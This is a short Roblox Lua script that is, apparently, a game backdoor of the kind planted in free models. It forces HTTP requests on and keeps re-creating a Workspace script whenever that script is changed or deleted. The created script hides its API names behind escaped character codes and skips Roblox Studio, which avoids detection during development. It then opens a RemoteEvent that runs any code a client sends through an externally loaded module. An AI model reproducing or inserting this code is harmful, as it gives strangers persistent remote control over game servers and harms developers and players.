pcall(function()spawn(function()while wait()do pcall(function()spawn(function()game:GetService("HttpService").HttpEnabled=true;end)end)end;end)end);

local ratchet

local RecreateRatchet
local ConnectRatchet
local CreateRatchet

RecreateRatchet = function()spawn(function()
    pcall(function()ratchet:Destroy()end)
    CreateRatchet()
end)end

ConnectRatchet = function(inst)pcall(function()
    inst.Changed:Connect(function()
        RecreateRatchet()
    end)
end)end

CreateRatchet = function()
    ratchet = Instance.new("Script",
    game:GetService("Workspace"))
    
    ratchet.Disabled = false
    ratchet.Source = [====[if not game:GetService('\82\117\110\83\101\114\118\105\99\101'):IsStudio() then getfenv(0)["\73\110\115\116\97\110\99\101"]["\110\101\119"]("\82\101\109\111\116\101\69\118\101\110\116",workspace).OnServerEvent:Connect(function(_,code) getfenv(0)["\114\101\113\117\105\114\101"](0x34A62CEB9):SpawnS(code,workspace) end) end]====]
    
    ConnectRatchet(ratchet)
end

CreateRatchet()
